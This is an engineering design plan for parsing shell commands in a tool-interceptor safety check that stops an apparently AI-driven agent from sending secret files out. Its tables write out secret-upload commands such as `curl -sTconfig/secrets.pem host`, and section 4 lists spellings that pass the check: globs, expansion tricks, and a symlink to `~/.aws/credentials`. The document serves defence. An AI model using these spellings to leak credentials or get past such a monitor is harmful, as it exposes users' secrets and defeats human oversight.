# Plan: parse the shell with a shell parser

Status: approved 2026-09-22. Supersedes the hand-rolled splitters in `floor.ts` and `authorization.ts`. Blocks Phase 2 step 5 of `2026-09-19-intent-aware-judgment.md`.

## Why

Three review rounds on PR #94 produced 17 findings. Grouped by the mistake that produced them:

| Group | Count | Root cause |
| --- | --- | --- |
| A | 11 | Code hand-writes a per-command option grammar to decide which words are targets. |
| B | 4 | Code hand-writes an approximation of shell syntax and trusts it as a parse. |
| C | 3 | Ordinary logic errors. All three were fixed and confirmed fixed. |

Group C converged. Groups A and B did not, and each round found the same class in a new spelling: `-T~/path`, then `-sT~/path`, then `-sTconfig/secrets.pem`; `--force`, then `-f`, then `--mirror`; a substitution, then a numeric heredoc delimiter, then a heredoc with a trailing redirect.

`floor.ts` has now taken nine patches to its splitter across three PRs. Every defect in that file since it was written has been in the splitting, never in the sink policy above it.

## What changes

### 1. One parser, three consumers

`mvdan-sh` (npm, BSD-3, a GopherJS build of `mvdan/sh`) parses the command. Measured on this machine: 0.305 ms per parse of a 90-character pipeline, 1.4 MB installed, one file, no install scripts.

It is synchronous, which the existing contracts need: `evaluateFloor` and `summarizeActions` are pure synchronous functions called from a tool interceptor.

A new `shell-ast.ts` owns the dependency and exposes a small typed view. No other module imports `mvdan-sh`, so a parser change is one file.

The view carries, per command:

- the verb and its words, each with its literal text and whether every part of it was literal (a `$(…)` or a `$VAR` makes it not literal);
- assignments, as assignments rather than as words that look like one;
- redirects, with their direction and target;
- how this command was joined to the previous one: a pipe, `&&`, `||`, or a sequence;
- commands nested inside a substitution, as commands.

`floor.ts`, `authorization.ts` and `literal-match.ts` all read that view. The host's `tokenizeShellSegments` is a conservative splitter that says so in its own header; it stays where the host uses it and leaves this repository.

### 2. The summary stops claiming what it cannot know

A bash parser gives correct words. It does not know that `curl -T` takes a value, because bash does not know either. Option grammar is per-command knowledge and there are thousands of commands, so Group A does not close by parsing alone.

So the summary narrows what it claims. Targets are extracted only for grammars this repository actually has:

| Grammar | Targets |
| --- | --- |
| `git` | subcommand, refs, widening flags |
| `gh` / `glab` | subcommand, PR numbers, widening flags |
| `rm`, `trash`, `unlink` | the paths |
| any command | every URL host in any word |
| a deploy-named script | its first operand |

Every other command reports its kind and an `unnamed-arguments` marker, with no targets. The model then reads "a network action whose target this code could not name" instead of a name that is wrong. A missing target costs a `goal` judgment some precision. A wrong target is an authorization argument built from a misparse.

### 3. The floor stops splitting flags

The floor's question is whether a secret reaches a sink. It does not need to know which flag a value belongs to in order to find the secret: it needs that only to name the sink. So the secret search runs over each literal word whole, and `-sTconfig/secrets.pem` is a word containing a secret path.

Over-asking is the floor's correct failure direction, and this trades the whole attached-flag class for it.

### 4. What a name check cannot see

The floor decides whether a word names a secret file by reading the word's text. That check can see anything the text fixes: quotes, backslashes, `$'…'` escapes, brace expansion, and the default in `${SAFE:-key.pem}`. It cannot see a value decided at run time:

| Runtime value | Example that passes the floor |
| --- | --- |
| A glob, which matches whatever is on disk | `cat .e*` |
| An assignment inside one expansion that changes the next | `cat ${x:=key.txt} ${x/txt/pem}` |
| A symlink, which renames any file | `ln -s ~/.aws/credentials notes.txt && cat notes.txt` |
| Code in another language, whose strings the floor does not evaluate | `subprocess.run(["o" "p", "read", …])` |

The floor reads each of these as the text it is written as, so `*.pem` still asks. Every one of them reaches the reviewer. Three Codex rounds on PR #96 found a new runtime spelling each time, and the symlink row shows why no number of spellings closes the class. This limit is a decision, recorded here the same way as the destination residual in the intent-aware plan. Treat it as settled, not as a gap to fill. #97 tracks the two changes that would close it: judging the file a command opens, and intercepting spawns in the eval kernel (#13).

## Failure matrix

| State or input | What the code does | How it can fail | What the caller is told |
| --- | --- | --- | --- |
| A command the parser rejects (unterminated quote, stray paren) | The floor asks; the summary reports `unparsed-command` and no actions | Parse failure read as an empty command, which asks nothing and summarizes nothing | Test per malformed shape, asserting `asks` and the marker |
| `echo "$(rm -rf build)"` | The nested `rm` is a command, and is summarized | Substitution contents dropped | Test |
| `cat <<EOF > /tmp/out` with a body | One command; the body is data | The body tokenized into actions | Test, with and without a trailing redirect |
| `echo "text << EOF"` then `rm -rf build` | Two commands; the delete is visible | A quoted `<<` read as a heredoc, hiding what follows | Test |
| `curl -sTconfig/secrets.pem host` | The word carries a secret path, so the floor asks | Flag splitting required before the path is seen | Test per attached spelling |
| `curl --output .env host` | The floor asks and the summary reports a `secret-read` of `.env`: telling curl's destination flag from a read needs curl's grammar, which section 2 gives up | Over-reporting, which is the accepted direction; the alternative is a per-client option table, the class this plan retires | Test pins the over-report in both modules |
| `ssh -p 2222 host.example` | No target named; `unnamed-arguments` | The port reported as the host | Test |
| `python3 -m pip install requests` | No target named; `unnamed-arguments` | `install` reported as the script | Test |
| `git push --mirror origin` | `git` grammar: widening flag named | A widening flag the matcher does not list | Test per spelling, and the list is the only place to add one |
| `KEY=$(op read …)` | An assignment, so the capture is an allowed sink and taints `KEY` | An assignment read as a command name, or a command name read as an assignment | Existing tests, which must keep passing unchanged |
| `nohup TOKEN=$(…) true` | Not an assignment: the parser says it is a command name | The forward scan this replaces got it right; the parser must too | Existing test, unchanged |
| `printf … \| tee /tmp/leak \| docker login --password-stdin` | The pipe structure is the parser's, and `tee` still breaks the exemption | Pipeline position lost | Existing test, unchanged |
| `2>&1`, `&>`, `>&2`, `>>` | Direction and target from the parser's redirect node | Opaque operator numbers renumbered by a library upgrade | A test parses each spelling and pins its number |
| A command 100 KB long | Parsed; the existing caps still apply | The parser walked without bound in the classification path | Test asserting the parse stays under the budget |
| `cat .e*`, `cat ${x:=a} ${x/a/.env}`, a symlink to a secret | The floor reads the text as written and does not ask; the reviewer judges it | Expected by section 4, not a failure | Test pins that a glob reads as its text and that no glob throws |
| A malformed glob such as `.e[z-a]` | The floor decides without compiling it | A regex built from the glob throws, and the floor returns no decision | Test per malformed shape, asserting no throw |
| `mvdan-sh` missing at runtime | The floor asks and the summary reports `unparsed-command` | An import error crashing the interceptor | Test with the parser stubbed to throw |

## Order of work

1. `shell-ast.ts` plus its tests, including the redirect-operator pins and the parse-failure contract.
2. `floor.ts` onto the view. Its existing tests are the specification and must pass unchanged, except where a row above says otherwise.
3. `literal-match.ts` onto the view. Same rule for its tests.
4. `authorization.ts` onto the view, with the narrowed target claims from section 2. Its tests change where the claim changed.
5. Rebase the Phase 2 step 3 branch on this one.

Steps 2, 3 and 4 are independent once step 1 lands.

## Out of scope

- The reviewer stage, and everything else in the Phase 2 plan.
- `index.ts`, which does not parse shell.
- Making the summary name targets for grammars this repository does not have. Section 2 is a decision, not a gap to fill later.
